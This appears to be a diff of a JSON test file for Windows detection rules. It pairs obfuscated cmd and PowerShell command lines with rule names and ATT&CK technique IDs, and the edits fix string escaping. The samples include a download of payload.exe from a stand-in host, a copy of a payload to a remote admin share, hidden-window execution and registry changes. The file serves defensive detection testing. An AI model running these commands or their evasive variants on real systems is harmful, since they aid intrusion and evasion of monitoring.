     "shell": "cmd.exe",
@@ -20657,7 +20657,7 @@
   },
   {
     "test_id": "t1012_144",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -21049,7 +21049,7 @@
   },
   {
     "test_id": "t1018_068",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem C:\\Users\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem C:\\Users\\\"",
     "target_rule": "proc_creation_win_susp_local_system_owner_account_discovery",
     "technique_id": "t1018",
     "shell": "cmd.exe",
@@ -21537,7 +21537,7 @@
   },
   {
     "test_id": "t1046_175",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -21545,7 +21545,7 @@
   },
   {
     "test_id": "t1046_176",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -21553,7 +21553,7 @@
   },
   {
     "test_id": "t1046_177",
-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -21561,7 +21561,7 @@
   },
   {
     "test_id": "t1046_178",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -21569,7 +21569,7 @@
   },
   {
     "test_id": "t1046_179",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -21577,7 +21577,7 @@
   },
   {
     "test_id": "t1046_180",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -23577,7 +23577,7 @@
   },
   {
     "test_id": "t1087_186",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \\\"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -23585,7 +23585,7 @@
   },
   {
     "test_id": "t1087_187",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -23593,7 +23593,7 @@
   },
   {
     "test_id": "t1087_188",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \\\" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -23601,7 +23601,7 @@
   },
   {
     "test_id": "t1087_189",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \\\" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -23609,7 +23609,7 @@
   },
   {
     "test_id": "t1087_190",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -23617,7 +23617,7 @@
   },
   {
     "test_id": "t1087_191",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -23625,7 +23625,7 @@
   },
   {
     "test_id": "t1087_192",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -23633,7 +23633,7 @@
   },
   {
     "test_id": "t1087_193",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \\\" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24209,7 +24209,7 @@
   },
   {
     "test_id": "t1087_265",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem C:\\Users\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem C:\\Users\\\"",
     "target_rule": "proc_creation_win_susp_local_system_owner_account_discovery",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24273,7 +24273,7 @@
   },
   {
     "test_id": "t1087_273",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \\\"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24281,7 +24281,7 @@
   },
   {
     "test_id": "t1087_274",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24289,7 +24289,7 @@
   },
   {
     "test_id": "t1087_275",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \\\" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24297,7 +24297,7 @@
   },
   {
     "test_id": "t1087_276",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \\\" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24305,7 +24305,7 @@
   },
   {
     "test_id": "t1087_277",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24313,7 +24313,7 @@
   },
   {
     "test_id": "t1087_278",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24321,7 +24321,7 @@
   },
   {
     "test_id": "t1087_279",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24329,7 +24329,7 @@
   },
   {
     "test_id": "t1087_280",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \\\" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -24697,7 +24697,7 @@
   },
   {
     "test_id": "t1087.002_008",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \\\"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24705,7 +24705,7 @@
   },
   {
     "test_id": "t1087.002_009",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24713,7 +24713,7 @@
   },
   {
     "test_id": "t1087.002_010",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \\\" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24721,7 +24721,7 @@
   },
   {
     "test_id": "t1087.002_011",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \\\" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24729,7 +24729,7 @@
   },
   {
     "test_id": "t1087.002_012",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24737,7 +24737,7 @@
   },
   {
     "test_id": "t1087.002_013",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24745,7 +24745,7 @@
   },
   {
     "test_id": "t1087.002_014",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \\\" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24753,7 +24753,7 @@
   },
   {
     "test_id": "t1087.002_015",
-    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \\\" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\\\"\"",
     "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
@@ -24801,7 +24801,7 @@
   },
   {
     "test_id": "t1112_011",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -24809,7 +24809,7 @@
   },
   {
     "test_id": "t1112_012",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -24817,7 +24817,7 @@
   },
   {
     "test_id": "t1112_013",
-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -24825,7 +24825,7 @@
   },
   {
     "test_id": "t1112_014",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -24833,7 +24833,7 @@
   },
   {
     "test_id": "t1112_015",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -24841,7 +24841,7 @@
   },
   {
     "test_id": "t1112_016",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -24857,7 +24857,7 @@
   },
   {
     "test_id": "t1124_001",
-    "target_commandline": "cmd.exe /c \"net.exe ti^me \\localhost\"",
+    "target_commandline": "cmd.exe /c \"net.exe ti^me \\\\localhost\"",
     "target_rule": "proc_creation_win_remote_time_discovery",
     "technique_id": "t1124",
     "shell": "cmd.exe",
@@ -25905,7 +25905,7 @@
   },
   {
     "test_id": "t1563.002_005",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1563.002",
     "shell": "cmd.exe",
@@ -25913,7 +25913,7 @@
   },
   {
     "test_id": "t1563.002_006",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1563.002",
     "shell": "cmd.exe",
@@ -25993,7 +25993,7 @@
   },
   {
     "test_id": "t1039_010",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -26001,7 +26001,7 @@
   },
   {
     "test_id": "t1039_011",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -26081,7 +26081,7 @@
   },
   {
     "test_id": "t1048_010",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1048",
     "shell": "cmd.exe",
@@ -26089,7 +26089,7 @@
   },
   {
     "test_id": "t1048_011",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1048",
     "shell": "cmd.exe",
@@ -26457,7 +26457,7 @@
   },
   {
     "test_id": "t1059.001_512",
-    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \"$env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\"$env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -26465,7 +26465,7 @@
   },
   {
     "test_id": "t1059.001_513",
-    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -26473,7 +26473,7 @@
   },
   {
     "test_id": "t1059.001_514",
-    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
